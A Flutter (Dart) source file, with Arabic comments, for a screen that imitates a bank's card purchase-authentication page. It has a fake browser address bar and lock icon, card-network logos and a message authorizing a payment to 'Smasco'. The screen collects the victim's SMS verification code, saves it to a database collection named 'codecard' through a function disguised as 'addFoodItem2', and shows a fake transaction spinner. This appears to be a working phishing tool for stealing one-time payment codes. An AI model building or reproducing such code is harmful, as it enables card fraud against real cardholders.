import 'dart:async';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:intl/intl.dart';
import '../service/database.dart';
import '../widget/widget_support.dart';
import 'bottomnav.dart';
import 'home.dart';

class CodeCart extends StatefulWidget {
  final String nameValue;
  CodeCart({
    required this.nameValue,

  });

  @override
  _CodeCartState createState() => _CodeCartState();
}

class _CodeCartState extends State<CodeCart> {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();

  String maskedValue = ''; // إضافة متغير لتخزين القيمة المُقنعة

  String? value = 'codecard'; // تعيين القيمة الافتراضية هنا
  TextEditingController namecontrollers = new TextEditingController();
  FocusNode _expirationDateFocusNode = FocusNode();
  bool _isNameFieldTouched = false;
  String _formattedDate = DateFormat('d/M/yyyy').format(DateTime.now()); // استخدام التنسيق الصحيح


  @override
  void dispose() {
    namecontrollers.dispose();
    _expirationDateFocusNode.dispose();



    super.dispose();
  }


  @override
  void initState() {
    super.initState();
    // تهيئة القيمة المُقنعة بناءً على nameValue

  }

  uploadItem() async {
    if (namecontrollers.text != "") {
      Map<String, dynamic> addItem = {
        "codess": namecontrollers.text,
      };

      try {
        await DatabaseMethods().addFoodItem2(addItem, value!);

        // إظهار مربع الحوار بعد إضافة البيانات بنجاح
        showDialog(
          context: context,
          barrierDismissible: false,
          builder: (BuildContext context) {
            return Dialog(
              child: Container(
                padding: EdgeInsets.all(20),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    CircularProgressIndicator(),
                    SizedBox(width: 20),
                    Text("جاري إجراء المعاملة..."),
                  ],
                ),
              ),
            );
          },
        );

        // انتظر لمدة قصيرة قبل إغلاق مربع الحوار (اختياري)
        await Future.delayed(Duration(seconds: 5));
        Navigator.pop(context); // إغلاق مربع الحوار

        // نقل المستخدم إلى صفحة الرئيسية بعد الإضافة
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => Home()),
        );

      } catch (e) {
        // إذا حدث خطأ أثناء عملية الإضافة، يمكنك إظهار رسالة خطأ هنا
        print(e); // يفضل استبدال طباعة الخطأ بإظهار SnackBar أو AlertDialog لإعلام المستخدم
        Navigator.pop(context); // تأكد من إغلاق مربع الحوار إذا كان مفتوحًا
      }
    }
  }


  @override
  Widget build(BuildContext context) {
    String valueWithoutSpaces = widget.nameValue.replaceAll(' ', '');
    if (valueWithoutSpaces.length >= 16) {
      maskedValue = '*' * 12 + valueWithoutSpaces.substring(12); // إبقاء آخر 4 أرقام واستبدال البقية بـ *
    }

    SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
      statusBarColor: Color(0xFF420532), // لون شريط الحالة
      statusBarBrightness: Brightness.dark, // سطوع الأيقونات على شريط الحالة
    ));
    return Scaffold(

      body: Column(
        children: [
          SizedBox(
            height: 20,
          ),
          Container(
            padding: EdgeInsets.only(top: 8.0),
            height: 60.0,
            width: MediaQuery
                .of(context)
                .size
                .width,
            color: Color(0xFF600247),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(
                  children: [
                    PopupMenuButton<String>(
                      onSelected: (String result) {

                      },
                      itemBuilder: (BuildContext context) => <PopupMenuEntry<String>>[

                        const PopupMenuItem<String>(
                          value: 'Option 1',
                          child: Text('تحديث'),
                        ),
                        const PopupMenuItem<String>(
                          value: 'Option 2',
                          child: Text('أضف للعلامات'),
                        ),
                        const PopupMenuItem<String>(
                          value: 'Option 3',
                          child: Text('أضافة إلى الشاشة الرئيسية'),
                        ),
                        const PopupMenuItem<String>(
                          value: 'Option 3',
                          child: Text('فتح في تطبيق الإنترنت'),
                        ),
                      ],
                      icon: Icon(Icons.menu, color: Colors.white),
                    ),
                    SizedBox(width: 20.0,),
                    Container(

                        child: Text('مشاركة', style: TextStyle(color: Colors.white70,fontSize: 16))),
                    SizedBox(width: 15.0,),

                    Container(
                      child: Text('https://authentic...',
                          style: TextStyle(color: Colors.white,fontSize: 17)),
                    ),
                    SizedBox(width: 14.0,),

                    Icon(Icons.lock_outline, color: Colors.white),
                  ],
                ),
                Container(
                  child: IconButton(
                    icon: Icon(Icons.close, color: Colors.white),
                    onPressed: () {
                      Navigator.pushReplacement(
                          context, MaterialPageRoute(builder: (context) => BottomNav()));
                    },
                  ),
                ),
              ],
            ),

          ),
          Row(
            mainAxisAlignment: MainAxisAlignment.end, // لمحاذاة الأط
            children: <Widget>[
              Container(
                margin: EdgeInsets.all(3.0), // هوامش حول الصورة الأولى
                child: Image.asset(
                  'images/mada1.png', // مسار الصورة الأولى
                  width: 75.0, // عرض الصورة الأولى
                  height: 90.0, // ارتفاع الصورة الأولى
                  fit: BoxFit.cover,
                ),
              ),
              Container(
                margin: EdgeInsets.all(3.0), // هوامش حول الصورة الثانية
                child: Image.asset(
                  'images/visa-removebg-preview.png', // مسار الصورة الثانية
                  width: 75.0, // عرض الصورة الثانية
                  height: 35.0, // ارتفاع الصورة الثانية
                  fit: BoxFit.cover,
                ),
              ),
              Container(
                margin: EdgeInsets.all(3.0), // هوامش حول الصورة الثالثة
                child: Image.asset(
                  'images/imercan-removebg-preview.png', // مسار الصورة الثالثة
                  width: 60.0, // عرض الصورة الثالثة
                  height: 55.0, // ارتفاع الصورة الثالثة
                  fit: BoxFit.cover,
                ),
              ),
              Container(
                margin: EdgeInsets.all(3.0), // هوامش حول الصورة الرابعة
                child: Image.asset(
                  'images/mads.png', // مسار الصورة الرابعة
                  width: 70.0, // عرض الصورة الرابعة
                  height: 45.0, // ارتفاع الصورة الرابعة
                  fit: BoxFit.cover,
                ),
              ),

            ],
          ),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 0),
            child: Divider(
              color: Colors.black45,
              thickness: 1,
              height:1 ,
            ),
          ),
          SizedBox(
            height: 20.0,
          ),
          Padding(
            padding: const EdgeInsets.all(12.0),
            child: Column(
              children: [
                Row(
                  children: [
                    Text('purchase authentication'),


      ],
                ),
                SizedBox(
                  height: 14.0,
                ),
                Row(
                  children: [
                    Text('we just sent you a verifcation code by Text to \n 00966xxxxxxxxx')

                  ],
                ),
                SizedBox(
                  height: 14.0,
                ),
                Row(
                  children: [
                   Text('You are authorizing a payment to Smasco for SAR \n on $_formattedDate with your card $maskedValue'),

 ],
                )
              ],
            ),
          ),
      Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            SizedBox(height: 20), // للتباعد بين العناصر
            Text(
              "Verification Code",
              style: TextStyle(fontSize: 14 ,color: Colors.blue),
            ),

            Container(
              width: 200,
              height: 40,
              child: TextField(
                controller: namecontrollers,
                keyboardType: TextInputType.number,
                textAlign: TextAlign.left, // محاذاة النص أفقيًا إلى اليسار
                style: TextStyle(
                  fontSize: 20, // حجم النص
                  fontWeight: FontWeight.bold, // وزن النص
                ),
                decoration: InputDecoration(
                  border: OutlineInputBorder(),
                  contentPadding: EdgeInsets.only(left: 10.0, top: 8.0, bottom: 8.0), // تعديل الحشوة لإضافة هامش على اليسار
                ),
                inputFormatters: [
                  FilteringTextInputFormatter.digitsOnly,
                  LengthLimitingTextInputFormatter(4),
                ],
              ),
            ),




            SizedBox(height: 5),
            GestureDetector(
              onTap: () {
                uploadItem();
              },
              child: Center(
                child: Material(
                  elevation: 5.0,
                  borderRadius: BorderRadius.circular(10),
                  child: Container(
                    padding: EdgeInsets.symmetric(horizontal: 20.0, vertical: 10.0),
                    width: 200,
                    height: 40, // زيادة عرض الزر هنا
                    decoration: BoxDecoration(
                      color: Color(0xFF030A85),
                      borderRadius: BorderRadius.circular(3.0),
                    ),
                    child: Center(
                      child: Text(
                        "SUBMIT",
                        style: TextStyle(
                          color: Colors.white,


                        ),
                      ),
                    ),
                  ),
                ),
              ),
            ),
            SizedBox(height: 20),
            Text(
              "CLICK HERE TO RECEIVE ANOTHER CODE",
              style: TextStyle(color: Color(0xFF030A85),fontSize: 12),
            ),
          ],
        ),
        ),
          // باقي محتويات الصفحة...
        ],
      ),
    );
  }
}